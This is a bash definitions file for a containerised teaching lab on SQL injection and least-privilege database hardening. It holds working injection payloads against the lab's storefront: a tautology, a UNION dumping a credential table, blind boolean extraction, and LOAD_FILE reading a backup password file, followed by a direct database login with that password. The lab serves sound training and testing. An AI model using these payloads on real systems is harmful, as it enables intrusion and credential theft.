#!/usr/bin/env bash
# Shared definitions for the SQL injection and least-privilege lab.
# Sourced by spawn/status/shell/reset/teardown/selftest. No side effects.
#
# This is the single source of truth for the lab's AS number, subnet, container
# names, IPs, interface names, account names, passwords and file paths. Every
# other script sources it; never hardcode any of these in a second place.
#
# The lab is played attacker then defender. A storefront's two endpoints paste a
# query parameter straight into the SQL text they send. Part 1 works four
# techniques against them in order:
#
#   1A  a tautology, returning the unreleased products the search is meant to
#       hide
#   1B  a UNION, reaching the storefront's own account table
#   1C  blind boolean extraction of that same table through the stock endpoint,
#       which prints one of two fixed strings and never a row
#   1D  LOAD_FILE, reading a file off the DATABASE host, which turns out to hold
#       a second database account and its password; the attacker then logs in to
#       the database directly with it
#
# Part 2 is three changes to the database's configuration and no change to
# either program. Each one closes something different, and the order they are
# applied in is the lesson:
#
#   2A  the application's grant is narrowed from the whole database to the one
#       table it reads, which kills 1B and 1C
#   2B  the application's FILE privilege is revoked, which kills 1D. It is a
#       separate stage because FILE is a global privilege: 2A's revoke is
#       scoped to `shop.*` and leaves it standing.
#   2C  the database accepts connections on its port only from the web tier,
#       which kills the direct login
#
# 1A survives all three, and that is the point rather than an oversight: the
# unreleased rows live in the one table the application legitimately reads, so
# no grant can hide them from a statement the application is entitled to run.
# selftest.sh asserts every one of those negatives, so a lab where 2A secretly
# killed LOAD_FILE, or where any stage broke the search page, would fail there
# rather than quietly making a later stage pointless.

AS=122
DC=LAB

# ---------------------------------------------------------------------------
# One segment, one switch, three hosts. There is no router and no gateway: the
# rule Part 2C writes is an input filter on the database host itself, so it
# needs no boundary device to sit on, and every packet the database sees still
# carries the address of the host that sent it.
SUBNET="122.0.0.0/24"
PREFIXLEN=24

WEB_IP="122.0.0.10"           # the storefront; both endpoints run here
DB_IP="122.0.0.20"            # MariaDB; every stage of Part 2 is worked here
ATTACKER_IP="122.0.0.66"      # the machine the requests are sent from

# ---------------------------------------------------------------------------
# The storefront.
#
# lighttpd serves two PHP endpoints through mod_cgi. Both are public on purpose:
# a product search and a stock check are what a shop's customers use, so nothing
# in this lab turns on the endpoints having been exposed by mistake.
HTTP_PORT=80
SEARCH_PATH="/search.php"
STOCK_PATH="/stock.php"
SEARCH_URL="http://${WEB_IP}:${HTTP_PORT}${SEARCH_PATH}"
STOCK_URL="http://${WEB_IP}:${HTTP_PORT}${STOCK_PATH}"

WEBROOT="/var/www/html"
SEARCH_FILE="${WEBROOT}/search.php"
STOCK_FILE="${WEBROOT}/stock.php"
SEARCH_PRISTINE="/usr/local/lib/minilabs/search.php"
STOCK_PRISTINE="/usr/local/lib/minilabs/stock.php"
SCHEMA_PRISTINE="/usr/local/lib/minilabs/schema.sql"

# The database credentials the endpoints connect with. They sit outside the
# document root, which is correct practice and is why no technique in this lab
# recovers them by fetching a URL.
DB_INC="/etc/minilabs/db.inc.php"
LIGHTTPD_CONF="/etc/lighttpd/shop.conf"
LIGHTTPD_PID="/run/lighttpd.pid"
PHP_CGI="/usr/bin/php-cgi82"

# ---------------------------------------------------------------------------
# The database.
DB_NAME="shop"
DB_PORT=3306
MY_CNF_D="/etc/my.cnf.d/zz-lab.cnf"

# The account the storefront connects as. Its starter grants are the deployment
# mistake Parts 2A and 2B correct: SELECT on the whole database when it reads
# one table, and FILE, which a web application has no use for at all.
APP_USER="appuser"
APP_PASS="sh0p-app-2019"

# The account the nightly dump job uses. Its password sits in a file on the
# database host, which is what technique 1D reads, and the direct login at the
# end of Part 1 is made with it. Part 2C is what stops that login.
BACKUP_USER="backup"
BACKUP_PASS="Bk9-QW3rf-2019"
BACKUP_CNF="/etc/mysql/backup.cnf"

# ---------------------------------------------------------------------------
# Facts about the data, pinned here because the handout quotes them and
# selftest.sh emits them as observations so the oracle catches them going stale.
PUBLISHED_COUNT=8             # rows with published = 1
TOTAL_PRODUCT_COUNT=11        # rows in product
HIDDEN_COUNT=3                # the unreleased lines a tautology exposes
CREDENTIAL_ROWS=4             # rows in credential
SEARCH_COLUMNS=4              # columns in the search statement's select list

ADMIN_USER="admin"
ADMIN_HASH="d4e7e93b257878579164665fa1fa5c76573b647547b2956572f4a24bd0bee7cb"
ADMIN_HASH_PREFIX="${ADMIN_HASH:0:8}"

# The product the blind technique asks its questions about. Its stock is above
# zero and it is published, so the unmodified request returns IN STOCK and the
# only thing that flips the answer is the predicate the attacker appends.
BLIND_SKU=3

# ---------------------------------------------------------------------------
# Interface names. Host-side NICs follow the platform's <AS>-<segment>
# convention; the switch-side port is named after the host it faces.
LAN_IF="${AS}-lan"

SW="S1"
SW_CTN="${AS}_L7_${DC}_${SW}"
BR="br0"
sw_port_of() { echo "${AS}-$1"; }        # 122-web, 122-db, 122-attacker

# ---------------------------------------------------------------------------
# Container names: <AS>_L7_<DC>_<name>.
WEB_CTN="${AS}_L7_${DC}_web"
DB_CTN="${AS}_L7_${DC}_db"
ATTACKER_CTN="${AS}_L7_${DC}_attacker"

HOSTS=(web db attacker)

# Every device that gets a starter config, in apply order. The database is
# first: the web server's own start-up check connects to it, so a web container
# configured before the database exists would report a database it cannot reach.
DEVICES=(db web attacker)

ctn_of() { echo "${AS}_L7_${DC}_$1"; }

ip_of() {   # <role> -> its address
    case "$1" in
        web)      echo "$WEB_IP" ;;
        db)       echo "$DB_IP" ;;
        attacker) echo "$ATTACKER_IP" ;;
        *)        echo "" ;;
    esac
}

# Lab root (parent of scripts/), resolved regardless of the caller's CWD.
LAB_DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )/.." >/dev/null 2>&1 && pwd )"

HOST_IMAGE="d_host_sqli"
SWITCH_IMAGE="miniinterneteth/d_switch"

# Open vSwitch is started by hand rather than by the image's supervisord
# entrypoint, which runs ovs-ctl with its default --mlockall. In a user
# namespace CAP_IPC_LOCK cannot exceed RLIMIT_MEMLOCK, so thread stacks fail to
# lock and ovs-vswitchd dies with "pthread_create failed". --no-mlockall is what
# makes this lab boot on a rootless daemon.
SWITCH_CMD='/usr/share/openvswitch/scripts/ovs-ctl start --no-mlockall --system-id=random && exec sleep infinity'

# net.ipv4.ping_group_range is pinned to "0 0" on every container. A rootless
# daemon rejects "0 2147483647" because the gid is outside the user namespace's
# map, and the two daemons ship different defaults, so pinning it is what makes
# ping print the same thing on both.
PING_SYSCTL=(--sysctl "net.ipv4.ping_group_range=0 0")

# ---------------------------------------------------------------------------
# The learner's filter, on the database host (Part 2C). The table is named
# `dbguard`; the chain is `input`, which is a hook name and not an nft keyword,
# so it is accepted as a chain name. reset.sh removes whatever the learner wrote
# by re-running the database's starter config, which deletes the table.
NFT_TABLE="dbguard"
NFT_CHAIN="input"

# ---------------------------------------------------------------------------
# True when anything in <dir> is newer than the image built from it. An image is
# otherwise only rebuilt when it is missing, which means an edit to
# image/Dockerfile, image/search.php or image/schema.sql never reaches a machine
# that built the image once -- and in this lab an unrebuilt image means the
# learner attacks a different program, or a different set of rows, from the one
# the handout quotes.
image_older_than_source() {   # <image> <dir>
    local img="$1" dir="$2" built newest
    built="$( docker image inspect -f '{{.Created}}' "$img" 2>/dev/null )" || return 1
    built="$( date -d "$built" +%s 2>/dev/null )" || return 1   # non-GNU date: skip the check
    newest="$( find "$dir" -type f -printf '%T@\n' 2>/dev/null | sort -n | tail -1 )"
    [ -n "$newest" ] || return 1
    [ "${newest%.*}" -gt "$built" ]
}

ensure_images() {
    if ! docker image inspect "$HOST_IMAGE" >/dev/null 2>&1; then
        echo "[spawn] building $HOST_IMAGE from $LAB_DIR/image (first run only)"
        docker build -t "$HOST_IMAGE" "$LAB_DIR/image" \
            || { echo "failed to build $HOST_IMAGE" >&2; return 1; }
    elif image_older_than_source "$HOST_IMAGE" "$LAB_DIR/image"; then
        echo "[spawn] rebuilding $HOST_IMAGE: $LAB_DIR/image changed since it was built"
        docker build -t "$HOST_IMAGE" "$LAB_DIR/image" \
            || { echo "failed to rebuild $HOST_IMAGE" >&2; return 1; }
    fi
    if ! docker image inspect "$SWITCH_IMAGE" >/dev/null 2>&1; then
        echo "[spawn] pulling $SWITCH_IMAGE (first run only)"
        docker pull "$SWITCH_IMAGE" >/dev/null \
            || { echo "failed to pull $SWITCH_IMAGE" >&2; return 1; }
    fi
}

# ---------------------------------------------------------------------------
# Privileged host networking, performed from a helper container, so the learner
# needs docker access and nothing else. Both ends of every veth pair are moved
# into lab containers, so the namespace the pair is created in never matters,
# which is why the helper runs --network=none rather than --network=host.
HELPER_CTN="$( ctn_of netadmin_helper )"

helper_start() {
    docker rm -f "$HELPER_CTN" >/dev/null 2>&1 || true
    docker run -d --rm --name "$HELPER_CTN" \
        --privileged --network=none --pid=host \
        "$HOST_IMAGE" sleep 600 >/dev/null
    for _ in $(seq 1 40); do
        if docker exec "$HELPER_CTN" true >/dev/null 2>&1; then
            return 0
        fi
        sleep 0.25
    done
    echo "helper container $HELPER_CTN did not become ready" >&2
    return 1
}

helper() { docker exec "$HELPER_CTN" "$@"; }
helper_stop() { docker rm -f "$HELPER_CTN" >/dev/null 2>&1 || true; }

# ---------------------------------------------------------------------------
# Shared read-only probes. status.sh and selftest.sh both use these, so the two
# cannot disagree about the lab's success condition.

running() { docker ps --format '{{.Names}}' | grep -qx "$1"; }

# --- calling the endpoints -------------------------------------------------

# `--data-urlencode -G` is what puts a quote, a space and a comment marker into
# the query string without the caller writing percent escapes; -m bounds the
# wait so a request that cannot be answered returns rather than hanging until
# curl's default timeout.
CURL_TIMEOUT=10

search_from() {   # <role> <the q parameter's value>
    docker exec "$( ctn_of "$1" )" \
        curl -s -m "$CURL_TIMEOUT" -G --data-urlencode "q=$2" "$SEARCH_URL" 2>/dev/null
}

stock_from() {    # <role> <the sku parameter's value>
    docker exec "$( ctn_of "$1" )" \
        curl -s -m "$CURL_TIMEOUT" -G --data-urlencode "sku=$2" "$STOCK_URL" 2>/dev/null \
        | tr -d '\r' | head -1
}

# --- the liveness check ----------------------------------------------------

# The storefront answering an ordinary request. Every defence stage is paired
# with it, so a "defence" that worked by taking the database away fails here
# instead of passing. An empty search term matches every published product, so
# the count it returns is the whole of the catalogue the shop means to show.
published_rows() {
    search_from attacker "" | grep -c ' | ' || true
}

page_serves() {   # -> ok | broken
    if [ "$( published_rows )" = "$PUBLISHED_COUNT" ]; then echo ok; else echo broken; fi
}

# --- the four techniques ---------------------------------------------------

# 1A. A tautology, so the statement's WHERE clause is true for every row rather
# than only for the published ones. The trailing `-- ` is not decoration: the
# program appends a per cent sign and a quote after the search term, and without
# a comment marker those two characters land inside the injected comparison and
# make it false.
TAUTOLOGY_PAYLOAD="%' OR 1=1 -- "
technique_tautology() {   # -> the number of product rows returned
    search_from attacker "$TAUTOLOGY_PAYLOAD" | grep -c ' | ' || true
}

# 1B. A UNION, appending a second result set from a table the endpoint was never
# meant to read. `zzz` in front makes the first branch match nothing, so what
# comes back is the second branch alone.
UNION_PAYLOAD="zzz%' UNION SELECT id, username, email, pass_hash FROM credential -- "
technique_union() {   # -> yes | no
    if search_from attacker "$UNION_PAYLOAD" | grep -qF "$ADMIN_HASH"
    then echo yes; else echo no; fi
}

# 1C. Blind boolean extraction, through an endpoint that prints IN STOCK or OUT
# OF STOCK and nothing else. Usable means the endpoint's answer still depends on
# the credential table: one predicate that is true of it and one that is false
# produce different strings. When the application may no longer read that table
# the statement fails, the endpoint prints OUT OF STOCK either way, and the
# channel carries nothing.
blind_answer() {   # <the character guessed for position 1> -> IN STOCK | OUT OF STOCK
    stock_from attacker \
        "${BLIND_SKU} AND SUBSTRING((SELECT pass_hash FROM credential WHERE username='${ADMIN_USER}'),1,1)='$1'"
}
technique_blind() {   # -> usable | blocked
    local t f
    t="$( blind_answer "${ADMIN_HASH:0:1}" )"     # true of the real value
    f="$( blind_answer "z" )"                      # never a hexadecimal digit
    if [ "$t" != "$f" ]; then echo usable; else echo blocked; fi
}

# 1D. LOAD_FILE, reading a file off the machine the DATABASE runs on. It needs
# the FILE privilege, which is global, and it returns NULL rather than an error
# when the account does not hold it -- so what the page prints is the same
# "query failed" a wrong column count produces, and the privilege has to be read
# from SHOW GRANTS rather than inferred from the page.
LOADFILE_PAYLOAD="zzz%' UNION SELECT 1, LOAD_FILE('/etc/mysql/backup.cnf'), 3, 4 -- "
technique_loadfile() {   # -> yes | no
    if search_from attacker "$LOADFILE_PAYLOAD" | grep -qF "$BACKUP_PASS"
    then echo yes; else echo no; fi
}

# The count the plan's oracle names: how many of the four return their expected
# data right now. Four in the starter state, one after Part 2.
techniques_working() {
    local n=0
    [ "$( technique_tautology )" -gt "$PUBLISHED_COUNT" ] && n=$(( n + 1 ))
    [ "$( technique_union )"    = yes    ] && n=$(( n + 1 ))
    [ "$( technique_blind )"    = usable ] && n=$(( n + 1 ))
    [ "$( technique_loadfile )" = yes    ] && n=$(( n + 1 ))
    echo "$n"
}

# --- the pivot -------------------------------------------------------------

# The end of Part 1: the password technique 1D recovered, used to log in to the
# database directly, from a machine that is not the web server. Nothing the two
# endpoints do is involved, which is why nothing done to the application's grants
# stops it. --connect-timeout bounds the wait, because Part 2C DROPS the packet
# rather than rejecting it and an unbounded client would sit through the TCP
# retransmission schedule.
DIRECT_TIMEOUT=5
direct_login() {   # -> yes | no
    if docker exec "$ATTACKER_CTN" mariadb \
            -h "$DB_IP" -P "$DB_PORT" --connect-timeout="$DIRECT_TIMEOUT" \
            -u "$BACKUP_USER" "-p${BACKUP_PASS}" -N \
            -e "SELECT COUNT(*) FROM ${DB_NAME}.credential" 2>/dev/null \
            | grep -qx "$CREDENTIAL_ROWS"
    then echo yes; else echo no; fi
}

# --- the database's own configuration --------------------------------------

# What the application account may do, read from the server rather than from
# whatever the learner believes they typed. Parts 2A and 2B are exactly these
# lines changing.
app_grants() {
    docker exec "$DB_CTN" mariadb -u root -N \
        -e "SHOW GRANTS FOR '${APP_USER}'@'%'" 2>/dev/null | tr -d '\r'
}

# Whether the application account still holds the global FILE privilege. Read
# from the grant table rather than by trying LOAD_FILE, so status.sh can report
# the privilege separately from the technique that uses it.
app_has_file_privilege() {   # -> yes | no
    if app_grants | grep -q '^GRANT[A-Z, ]*FILE[A-Z, ]* ON \*\.\*'
    then echo yes; else echo no; fi
}

db_running() {
    docker exec "$DB_CTN" sh -c 'mariadb -u root -e "SELECT 1" >/dev/null 2>&1'
}

lighttpd_running() {
    docker exec "$WEB_CTN" sh -c 'pgrep -x lighttpd >/dev/null 2>&1'
}

nft_ruleset() {
    docker exec "$DB_CTN" nft list ruleset 2>/dev/null | grep -v '^[[:space:]]*$' || true
}
